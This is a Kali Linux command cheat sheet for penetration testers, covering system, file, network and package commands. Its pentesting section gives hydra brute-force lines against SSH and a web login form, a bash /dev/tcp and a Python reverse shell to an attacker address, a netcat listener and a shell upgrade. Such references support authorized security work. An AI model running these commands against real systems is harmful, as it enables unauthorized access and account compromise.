# Kali Linux Master Commands
**Author: Manish Verma**

---

## 📌 Objective

**Scope:** All penetration testing scenarios using Kali Linux  
**Tools Used:** Built-in Kali tools, custom scripts  
**Outcome:** Efficient system navigation and pentest execution

---

## 💻 System Information

```bash
uname -a                        # Kernel version
cat /etc/os-release             # OS details
id                              # Current user & groups
whoami                          # Current username
hostname                        # Hostname
cat /proc/cpuinfo               # CPU info
free -h                         # Memory info
df -h                           # Disk space
env                             # Environment variables
```

---

## 📁 File Management

```bash
ls -la                          # List files with permissions
find / -name "*.txt" 2>/dev/null   # Find files
find / -perm -4000 2>/dev/null     # Find SUID files
chmod +x script.sh              # Make executable
cp file.txt /tmp/               # Copy file
tar -czf archive.tar.gz folder/ # Compress
tar -xzf archive.tar.gz         # Extract
```

---

## 🌐 Network Commands

```bash
ip a                            # Show interfaces
ip route                        # Routing table
netstat -tulpn                  # Open ports
ss -tulpn                       # Socket statistics
ping -c 4 <IP>                  # Ping test
traceroute <IP>                 # Trace route
curl -I http://<IP>             # HTTP headers
wget http://<IP>/file           # Download file
```

---

## 📦 Package Management

```bash
apt update && apt upgrade -y    # Update system
apt install <package>           # Install package
apt remove <package>            # Remove package
dpkg -l | grep <name>           # List installed
pip3 install <package>          # Python packages
```

---

## ⚔️ Pentesting Commands

```bash
# Nmap Scans
nmap -sC -sV -oA scan <IP>      # Default scripts + version
nmap -p- --min-rate 5000 <IP>   # All ports fast
nmap -sU --top-ports 20 <IP>    # UDP top ports
nmap --script vuln <IP>         # Vulnerability scan

# Password Attacks
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> ssh
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Wordlists
ls /usr/share/wordlists/        # Available wordlists
gunzip /usr/share/wordlists/rockyou.txt.gz

# Reverse Shell
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# Netcat Listener
nc -lvnp 4444

# Shell Upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## ⚠️ Disclaimer

All commands documented here are for educational purposes and must only be used in authorized environments.
